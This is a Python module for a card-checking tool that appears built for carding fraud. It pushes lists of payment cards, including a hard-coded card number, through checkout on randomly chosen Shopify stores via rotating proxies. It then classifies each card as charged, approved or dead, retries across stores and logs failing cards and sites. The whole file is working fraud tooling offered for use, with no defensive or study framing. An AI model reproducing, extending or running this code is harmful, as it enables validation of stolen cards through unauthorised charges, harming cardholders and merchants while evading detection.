import asyncio
import aiohttp
import random
import re
import os

import httpx

try:
    from checker import run_checkout_for_card, CheckStatus, normalize_proxy
except ImportError:
    class CheckStatus:
        CHARGED  = "CHARGED"
        APPROVED = "APPROVED"
        DECLINED = "DECLINED"
        ERROR    = "ERROR"
    def run_checkout_for_card(shop_url, card, proxy_url=""):
        raise RuntimeError("checker module not available")
    def normalize_proxy(proxy):
        return proxy

# ── Checker API ───────────────────────────────────────────────────────────────
CHECKER_API  = os.environ.get("CHECKER_API_URL", "http://localhost:8099")
_API_TIMEOUT = httpx.Timeout(connect=5.0, read=30.0, write=5.0, pool=10.0)

# ── Persistent shared connection pool (created once, reused forever) ──────────
_http_client: httpx.AsyncClient | None = None
_client_lock = asyncio.Lock()

# ── API state: None=unknown, True=up, False=down ──────────────────────────────
_api_ok        = None
_api_fail_count = 0
_API_FAIL_RESET = 5   # reset to "unknown" after this many consecutive failures

# ── Session-level bad sites (Step 1-12 errors) ────────────────────────────────
_session_bad_sites: set[str] = set()

def _load_errorsite_set() -> set:
    """Read errorsite.txt and return all blacklisted site URLs as a set."""
    sites: set[str] = set()
    try:
        with open("errorsite.txt", "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line:
                    site = line.split("#")[0].strip()
                    if site:
                        sites.add(site)
    except FileNotFoundError:
        pass
    except Exception:
        pass
    return sites


def clear_session_bad_sites():
    """Reset per-session state. Sites are never globally blacklisted anymore."""
    global _session_bad_sites
    _session_bad_sites = set()


async def _get_client() -> httpx.AsyncClient:
    global _http_client
    async with _client_lock:
        if _http_client is None or _http_client.is_closed:
            _http_client = httpx.AsyncClient(
                timeout=_API_TIMEOUT,
                limits=httpx.Limits(
                    max_connections=500,
                    max_keepalive_connections=100,
                    keepalive_expiry=30.0,
                ),
            )
    return _http_client


async def _api_healthy() -> bool:
    global _api_ok, _api_fail_count
    if _api_ok is True:
        return True
    try:
        c = await _get_client()
        r = await c.get(f"{CHECKER_API}/health", timeout=2.0)
        if r.status_code == 200:
            _api_ok = True
            _api_fail_count = 0
            return True
    except Exception:
        pass
    _api_ok = False
    return False


class _ApiResult:
    """Mimics CheckResult enough for proxy_utils logic (local service fallback)."""
    def __init__(self, data: dict):
        name = data.get("status", "ERROR")
        self.status      = {"CHARGED": CheckStatus.CHARGED,
                            "APPROVED": CheckStatus.APPROVED,
                            "DECLINED": CheckStatus.DECLINED}.get(name, CheckStatus.ERROR)
        self.status_code  = data.get("status_code", "")
        self.amount       = data.get("amount", "")
        self.currency     = "USD"
        self.gateway      = "Shopify Payments"
        self.site_name    = ""
        self.receipt_url  = data.get("receipt_url", "")
        self.elapsed_ms   = 0
        self.error        = Exception(data["error"]) if data.get("error") else None
        self.retryable    = data.get("retryable", False)


async def _run_via_api(shop_url: str, card: str, proxy_raw: str) -> _ApiResult:
    """POST to local checker service — secondary fallback."""
    global _api_ok, _api_fail_count
    c = await _get_client()
    r = await c.post(f"{CHECKER_API}/check", json={
        "card": card, "shop_url": shop_url, "proxy": proxy_raw,
    })
    r.raise_for_status()
    _api_fail_count = 0
    return _ApiResult(r.json())


async def _run_direct(shop_url: str, card: str, proxy_raw: str):
    """Last-resort fallback: run checker.py in a thread."""
    try:
        proxy_url = normalize_proxy(proxy_raw) if proxy_raw else ""
    except Exception:
        proxy_url = ""
    return await asyncio.to_thread(run_checkout_for_card, shop_url, card, proxy_url)


async def _run_checkout(shop_url: str, card: str, proxy_raw: str):
    """Try local API first, fall back to direct checker."""
    try:
        return await _run_via_api(shop_url, card, proxy_raw)
    except Exception:
        return await _run_direct(shop_url, card, proxy_raw)


# ── Internal result builder ───────────────────────────────────────────────────
def _make_result(card, status, message, price='-', gateway='Shopify Payments',
                 receipt_url='', retryable=False, proxy='', time=None):
    return {
        'status':      status,
        'message':     message,
        'card':        card,
        'gateway':     gateway,
        'price':       price,
        'receipt_url': receipt_url,
        'retry':       retryable,
        'proxy':       proxy,
        'time':        time,
    }


# ── Proxy error detection ─────────────────────────────────────────────────────
_PROXY_ERR_SIGNALS = (
    'curl: (28)', 'curl: (7)', 'curl: (35)', 'curl: (56)',
    'connection timed out', 'connection timeout', 'failed to perform',
    'timed out', 'proxy', 'eof occurred', 'remote end closed',
)


def _is_proxy_err(msg: str) -> bool:
    m = msg.lower()
    return any(s in m for s in _PROXY_ERR_SIGNALS)


# ── Card checking ─────────────────────────────────────────────────────────────
async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy=None):
    """
    Retry on ANY site error — never blacklist sites.
    Only stop when card gives DECLINED / CHARGED / APPROVED.
    Per-card: avoid re-using sites that had Step-0 (no product) or API conn errors.
    """
    if not sites:   return _make_result(card, 'Dead', 'No sites configured')
    if not proxies: return _make_result(card, 'Dead', 'No proxy configured')

    import re as _re
    last_err     = 'Unknown error'
    MAX_TRIES    = 8           # max site attempts per card
    failed_sites = set()      # per-card only: skip sites with no product or conn error

    for attempt in range(MAX_TRIES):
        # Pick a site — skip per-card failures only, never session-wide blacklist
        available = [s for s in sites if s not in failed_sites] or list(sites)
        shop_url  = random.choice(available)
        proxy_raw = (start_proxy if attempt == 0 and start_proxy else random.choice(proxies))

        # ── Run checkout ──
        try:
            res = await _run_checkout(shop_url, card, proxy_raw)
        except Exception as e:
            last_err = str(e)
            failed_sites.add(shop_url)   # conn error → skip this site for this card
            await asyncio.sleep(0.5)
            continue

        _gw   = getattr(res, 'gateway', 'Shopify Payments') or 'Shopify Payments'
        _ms   = getattr(res, 'elapsed_ms', 0) or 0
        _time = round(_ms / 1000, 2) if _ms else None

        # ── Terminal results: card gave a real answer ──
        if res.status == CheckStatus.CHARGED:
            return _make_result(card, 'Charged', 'Payment was successful ✅',
                                price=res.amount or '-',
                                gateway=_gw,
                                receipt_url=res.receipt_url or '',
                                proxy=proxy_raw, time=_time)

        if res.status == CheckStatus.APPROVED:
            msg = res.status_code or 'APPROVED'
            return _make_result(card, 'Approved', msg,
                                price=res.amount or '-',
                                gateway=_gw,
                                proxy=proxy_raw, time=_time)

        if res.status == CheckStatus.DECLINED:
            msg = str(res.error or res.status_code or 'DECLINED')
            return _make_result(card, 'Dead', msg, gateway=_gw)

        # ── Site/step error → try another site, never blacklist ──
        last_err = str(res.error or res.status_code or 'Site error')

        # Step 0 = no affordable product → skip this site for this card only
        if 'Step 0' in last_err:
            failed_sites.add(shop_url)
            await asyncio.sleep(0.2)
            continue

        # Proxy error → retry same or different site with next proxy
        if _is_proxy_err(last_err):
            await asyncio.sleep(0.5)
            continue

        # Any other step error (Step 1–12) or retryable → just try next site
        await asyncio.sleep(0.2)
        continue

    # All attempts exhausted without a card-level result
    _log_error_card(card, last_err)
    return _make_result(card, 'Dead', last_err)


def _log_error_site(site: str, reason: str):
    """Append site to errorsite.txt when a Step 1-12 error occurs during checking."""
    try:
        line = f"{site}  # {reason[:80]}\n"
        with open("errorsite.txt", 'a', encoding='utf-8') as f:
            f.write(line)
    except Exception:
        pass


def clear_error_log():
    """Clear error.txt at the start of each mass check session."""
    try:
        open("error.txt", 'w').close()
    except Exception:
        pass


def _log_error_card(card: str, reason: str):
    """Append failed card to error.txt (cards that errored after all retries)."""
    try:
        line = f"{card}  # {reason[:100]}\n"
        with open("error.txt", 'a', encoding='utf-8') as f:
            f.write(line)
    except Exception:
        pass


# ── Site testing ──────────────────────────────────────────────────────────────
async def test_site(site, proxy):
    try:
        proxy_url = ""
        try:
            proxy_url = normalize_proxy(proxy)
        except Exception:
            pass
        test_card = "5154623245618097|03|2032|156"
        res = await asyncio.to_thread(run_checkout_for_card, site, test_card, proxy_url)
        error_msg = str(res.error or '')
        # Detect step errors (Step 0 – Step 12) for errorsite.txt classification
        import re as _re
        m = _re.search(r'Step (\d+) failed', error_msg, _re.IGNORECASE)
        if m:
            step = int(m.group(1))
            return {'site': site, 'status': 'step_error', 'step': step, 'msg': error_msg[:100]}
        alive = res.status != CheckStatus.ERROR or not res.retryable
        return {'site': site, 'status': 'alive' if alive else 'dead'}
    except Exception as e:
        return {'site': site, 'status': 'dead', 'msg': str(e)[:80]}


# ── Proxy helpers ─────────────────────────────────────────────────────────────
def _proxy_host_port(proxy: str):
    p = proxy.strip()
    p = re.sub(r'^(https?|socks[45])://', '', p)
    p = re.sub(r'^[^@]+@', '', p)
    parts = p.split(':')
    try:
        host = parts[0]
        port = int(parts[1])
        return host, port
    except:
        return None, None


async def test_proxy(proxy):
    """
    Real HTTP test through the proxy — not just a TCP port knock.
    Tries to fetch a small URL via the proxy; only ALIVE if HTTP succeeds.
    """
    proxy_url = _proxy_to_url(proxy)
    test_urls  = ['http://httpbin.org/ip', 'http://api.ipify.org', 'http://icanhazip.com']
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        conn    = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=conn) as s:
            for url in test_urls:
                try:
                    async with s.get(url, proxy=proxy_url, allow_redirects=True) as r:
                        if r.status == 200:
                            return {'proxy': proxy, 'status': 'alive'}
                except Exception:
                    continue
        return {'proxy': proxy, 'status': 'dead'}
    except Exception:
        return {'proxy': proxy, 'status': 'dead'}


def _proxy_to_url(proxy: str) -> str:
    p = proxy.strip()
    if p.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return p
    parts = p.split(':')
    if len(parts) == 2:
        return f'http://{p}'
    if len(parts) >= 4:
        host, port = parts[0], parts[1]
        pw_idx    = p.rfind(':')
        user_part = p[len(host)+len(port)+2:pw_idx]
        pw_part   = p[pw_idx+1:]
        return f'http://{user_part}:{pw_part}@{host}:{port}'
    return f'http://{p}'


async def get_proxy_ip(proxy: str) -> str | None:
    proxy_url = _proxy_to_url(proxy)
    if proxy_url.startswith('socks'):
        return None
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get('https://api.ipify.org', proxy=proxy_url) as r:
                if r.status == 200:
                    return (await r.text()).strip()
    except:
        pass
    return None
